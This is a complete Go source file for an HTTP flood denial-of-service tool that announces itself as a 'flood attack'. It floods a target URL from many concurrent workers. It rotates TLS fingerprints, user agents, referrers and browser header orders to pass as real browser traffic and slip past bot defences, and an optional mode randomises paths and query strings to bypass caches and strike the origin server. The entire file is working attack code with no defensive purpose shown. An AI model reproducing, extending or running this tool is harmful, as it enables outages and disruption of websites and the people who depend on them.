package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/bogdanfinn/tls-client/profiles"
	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
)

var (
	// Browser profiles for TLS fingerprinting
	browserProfiles = []profiles.ClientProfile{
		profiles.Chrome_120,
		profiles.Chrome_124,
		profiles.Firefox_120,
		profiles.Chrome_133_PSK,
		profiles.Chrome_131,
	}
	
	// Legitimate User-Agents (removed botnet signatures)
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	}
	
	// Accept languages
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-US,en;q=0.9,fr;q=0.8",
		"en-US,en;q=0.9,es;q=0.8",
		"en-US,en;q=0.9,de;q=0.8",
	}

	// Referrers for legitimate traffic patterns
	referrers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://www.yahoo.com/",
		"",
	}

	// Statistics
	totalRequests  int64
	successCount   int64
	errorCount     int64
	bytesReceived  int64
)

type Worker struct {
	id        int
	client    tls_client.HttpClient
	workChan  chan struct{}
	ctx       context.Context
	target    string
	cached    bool
	mu        sync.Mutex
}

type WorkerPool struct {
	workers    []*Worker
	workChan   chan struct{}
	ctx        context.Context
	cancel     context.CancelFunc
	wg         sync.WaitGroup
	genWg      sync.WaitGroup // Add a separate WaitGroup for generateWork
	target     string
	cached     bool
	rate       int
}

func main() {
	rand.Seed(time.Now().UnixNano())
	
	// Set GOMAXPROCS to use all CPU cores
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	if len(os.Args) < 5 {
		log.Fatalf("Usage: %s <url> <rate> <secs> <threads> [--cached]", os.Args[0])
	}
	
	parsedURL, err := url.Parse(os.Args[1])
	if err != nil || parsedURL.Host == "" {
		log.Fatal("Invalid URL provided")
	}
	
	target := os.Args[1]
	rate, _ := strconv.Atoi(os.Args[2])
	secs, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	
	if rate < 1 || secs < 1 || threads < 1 {
		log.Fatal("Invalid arguments: rate, secs, and threads must be > 0")
	}
	
	cached := false
	for _, arg := range os.Args[5:] {
		if strings.ToLower(arg) == "--cached" {
			cached = true
			break
		}
	}

	if cached {
		target = prepareUrl(target)
	}

	// Create worker pool
	pool := NewWorkerPool(threads, rate, target, cached)
	
	// Start statistics reporter
	go statsReporter(secs)
	
	fmt.Printf("Starting optimized flood attack\n")
	fmt.Printf("Target: %s\n", target)
	fmt.Printf("Workers: %d\n", threads)
	fmt.Printf("Rate: %d req/worker\n", rate)
	fmt.Printf("Duration: %d seconds\n", secs)
	fmt.Printf("CPU Cores: %d\n", runtime.NumCPU())
	fmt.Println("----------------------------------------")
	
	// Start the pool
	pool.Start()
	
	// Run for specified duration
	time.Sleep(time.Duration(secs) * time.Second)
	
	// Stop the pool
	pool.Stop()
	
	// Final statistics
	fmt.Println("\n----------------------------------------")
	fmt.Printf("Attack completed!\n")
	fmt.Printf("Total requests: %d\n", atomic.LoadInt64(&totalRequests))
	fmt.Printf("Successful: %d\n", atomic.LoadInt64(&successCount))
	fmt.Printf("Failed: %d\n", atomic.LoadInt64(&errorCount))
	fmt.Printf("Data received: %.2f MB\n", float64(atomic.LoadInt64(&bytesReceived))/(1024*1024))
}

func NewWorkerPool(workerCount, rate int, target string, cached bool) *WorkerPool {
	ctx, cancel := context.WithCancel(context.Background())
	
	pool := &WorkerPool{
		workers:  make([]*Worker, workerCount),
		workChan: make(chan struct{}, workerCount*rate*2), // Buffer for smooth operation
		ctx:      ctx,
		cancel:   cancel,
		target:   target,
		cached:   cached,
		rate:     rate,
	}
	
	// Create workers
	for i := 0; i < workerCount; i++ {
		worker := &Worker{
			id:       i,
			workChan: pool.workChan,
			ctx:      ctx,
			target:   target,
			cached:   cached,
		}
		pool.workers[i] = worker
	}
	
	return pool
}

func (p *WorkerPool) Start() {
	// Start all workers
	for _, worker := range p.workers {
		p.wg.Add(1)
		go worker.Run(&p.wg)
	}
	
	// Start work generator
	p.genWg.Add(1)
	go p.generateWork()
}

func (p *WorkerPool) Stop() {
	p.cancel()
	p.genWg.Wait() // Wait for generateWork to finish
	close(p.workChan)
	p.wg.Wait()
}

func (p *WorkerPool) generateWork() {
	defer p.genWg.Done()
	ticker := time.NewTicker(time.Millisecond * 10) // Fast work generation
	defer ticker.Stop()
	
	for {
		select {
		case <-p.ctx.Done():
			return
		case <-ticker.C:
			// Generate work for all workers
			for i := 0; i < len(p.workers)*p.rate; i++ {
				select {
				case p.workChan <- struct{}{}:
				case <-p.ctx.Done():
					return
				default:
					// Channel full, skip
				}
			}
		}
	}
}

func (w *Worker) Run(wg *sync.WaitGroup) {
	defer wg.Done()
	
	// Create initial client
	w.createClient()
	
	requestCount := 0
	
	for {
		select {
		case <-w.ctx.Done():
			if w.client != nil {
				w.client.CloseIdleConnections()
			}
			return
		case _, ok := <-w.workChan:
			if !ok {
				if w.client != nil {
					w.client.CloseIdleConnections()
				}
				return
			}
			
			// Perform request
			if w.cached {
				w.doRequestCached()
			} else {
				w.doRequest()
			}
			
			requestCount++
			
			// Recreate client periodically to avoid connection issues
			if requestCount%100 == 0 {
				w.mu.Lock()
				if w.client != nil {
					w.client.CloseIdleConnections()
				}
				w.createClient()
				w.mu.Unlock()
			}
		}
	}
}

func (w *Worker) createClient() {
	for attempts := 0; attempts < 3; attempts++ {
		client, err := createOptimizedClient()
		if err == nil {
			w.client = client
			return
		}
		time.Sleep(time.Millisecond * 100)
	}
}

func (w *Worker) doRequest() {
	if w.client == nil {
		w.createClient()
		if w.client == nil {
			return
		}
	}
	
	req, err := http.NewRequest("GET", w.target, nil)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	
	// Set headers
	req.Header = getOptimizedHeaders()
	
	// Add referrer
	if ref := referrers[rand.Intn(len(referrers))]; ref != "" {
		req.Header.Set("Referer", ref)
	}
	
	atomic.AddInt64(&totalRequests, 1)
	
	// Perform request with timeout
	resp, err := w.client.Do(req)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	
	// Read response body
	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&bytesReceived, n)
		resp.Body.Close()
	}
	
	atomic.AddInt64(&successCount, 1)
}

func (w *Worker) doRequestCached() {
	if w.client == nil {
		w.createClient()
		if w.client == nil {
			return
		}
	}
	
	// Generate random URL for cache busting
	randomUrl := strings.ReplaceAll(w.target, "SOMESHIT.js", randPath())
	
	// Add query parameters
	if rand.Intn(3) == 0 {
		params := url.Values{}
		params.Add("_", fmt.Sprintf("%d", time.Now().UnixNano()))
		params.Add("cb", fmt.Sprintf("%d", rand.Int63()))
		
		if strings.Contains(randomUrl, "?") {
			randomUrl += "&" + params.Encode()
		} else {
			randomUrl += "?" + params.Encode()
		}
	}
	
	req, err := http.NewRequest("GET", randomUrl, nil)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	
	// Set headers
	req.Header = getOptimizedHeaders()
	
	// Add referrer
	if ref := referrers[rand.Intn(len(referrers))]; ref != "" {
		req.Header.Set("Referer", ref)
	}
	
	atomic.AddInt64(&totalRequests, 1)
	
	// Perform request
	resp, err := w.client.Do(req)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	
	// Read response body
	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&bytesReceived, n)
		resp.Body.Close()
	}
	
	atomic.AddInt64(&successCount, 1)
}

func createOptimizedClient() (tls_client.HttpClient, error) {
	// Random browser profile
	profile := browserProfiles[rand.Intn(len(browserProfiles))]
	
	// Create cookie jar
	jar := tls_client.NewCookieJar()
	
	// Optimized transport settings
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profile),
		tls_client.WithCookieJar(jar),
		tls_client.WithNotFollowRedirects(),
		tls_client.WithInsecureSkipVerify(),
	}
	
	// Additional transport options if supported by the library version
	transportOpts := &tls_client.TransportOptions{
		DisableKeepAlives:      false,
		DisableCompression:     false,
		MaxIdleConns:           1000,
		MaxIdleConnsPerHost:    100,
		MaxConnsPerHost:        0, // No limit
		MaxResponseHeaderBytes: 1 << 20,
		WriteBufferSize:        1 << 16,
		ReadBufferSize:         1 << 16,
	}
	
	options = append(options, tls_client.WithTransportOptions(transportOpts))
	
	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
}

func getOptimizedHeaders() http.Header {
	userAgent := userAgents[rand.Intn(len(userAgents))]
	acceptLang := acceptLanguages[rand.Intn(len(acceptLanguages))]
	
	headers := http.Header{
		"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"},
		"Accept-Encoding":           {"gzip, deflate, br"},
		"Accept-Language":           {acceptLang},
		"Cache-Control":             {"no-cache"},
		"Connection":                {"keep-alive"},
		"Upgrade-Insecure-Requests": {"1"},
		"User-Agent":                {userAgent},
	}
	
	// Add browser-specific headers
	if strings.Contains(userAgent, "Chrome") {
		headers["Sec-Ch-Ua"] = []string{`"Chromium";v="120", "Google Chrome";v="120", "Not_A Brand";v="24"`}
		headers["Sec-Ch-Ua-Mobile"] = []string{"?0"}
		headers["Sec-Ch-Ua-Platform"] = []string{`"Windows"`}
		headers["Sec-Fetch-Dest"] = []string{"document"}
		headers["Sec-Fetch-Mode"] = []string{"navigate"}
		headers["Sec-Fetch-Site"] = []string{"none"}
		headers["Sec-Fetch-User"] = []string{"?1"}
		
		// Chrome header order
		headers[http.HeaderOrderKey] = []string{
			"Accept",
			"Accept-Encoding",
			"Accept-Language",
			"Cache-Control",
			"Connection",
			"Sec-Ch-Ua",
			"Sec-Ch-Ua-Mobile",
			"Sec-Ch-Ua-Platform",
			"Sec-Fetch-Dest",
			"Sec-Fetch-Mode",
			"Sec-Fetch-Site",
			"Sec-Fetch-User",
			"Upgrade-Insecure-Requests",
			"User-Agent",
		}
	} else if strings.Contains(userAgent, "Firefox") {
		// Firefox header order
		headers[http.HeaderOrderKey] = []string{
			"Accept",
			"Accept-Language",
			"Accept-Encoding",
			"Connection",
			"Upgrade-Insecure-Requests",
			"User-Agent",
			"Cache-Control",
		}
	}
	
	return headers
}

func randPath() string {
	// Common file types
	extensions := []string{
		".html", ".htm", ".php", ".asp", ".aspx", ".jsp",
		".js", ".css", ".jpg", ".jpeg", ".png", ".gif",
		".json", ".xml", ".txt", ".pdf", ".doc", ".docx",
	}
	
	// Common directory patterns
	dirs := []string{
		"", "assets/", "static/", "images/", "css/", "js/",
		"media/", "files/", "content/", "resources/",
	}
	
	// Generate random filename
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	nameLen := rand.Intn(10) + 5
	filename := make([]byte, nameLen)
	for i := range filename {
		filename[i] = charset[rand.Intn(len(charset))]
	}
	
	dir := dirs[rand.Intn(len(dirs))]
	ext := extensions[rand.Intn(len(extensions))]
	
	return fmt.Sprintf("%s%s%s", dir, string(filename), ext)
}

func prepareUrl(urlToModify string) string {
	modified, err := url.Parse(urlToModify)
	if err != nil {
		log.Fatal("Failed to parse URL")
	}
	newPath := strings.TrimSuffix(modified.Path, "/") + "/SOMESHIT.js"
	modified.Path = newPath
	return modified.String()
}

func statsReporter(duration int) {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	
	startTime := time.Now()
	lastRequests := int64(0)
	
	for {
		select {
		case <-ticker.C:
			current := atomic.LoadInt64(&totalRequests)
			rps := current - lastRequests
			lastRequests = current
			
			elapsed := time.Since(startTime).Seconds()
			avgRps := float64(current) / elapsed
			
			success := atomic.LoadInt64(&successCount)
			errors := atomic.LoadInt64(&errorCount)
			successRate := float64(success) / float64(current) * 100
			
			fmt.Printf("\r[%3.0fs] Req/s: %d | Avg: %.0f | Total: %d | Success: %.1f%% | Errors: %d",
				elapsed, rps, avgRps, current, successRate, errors)
			
			if elapsed >= float64(duration) {
				return
			}
		}
	}
}
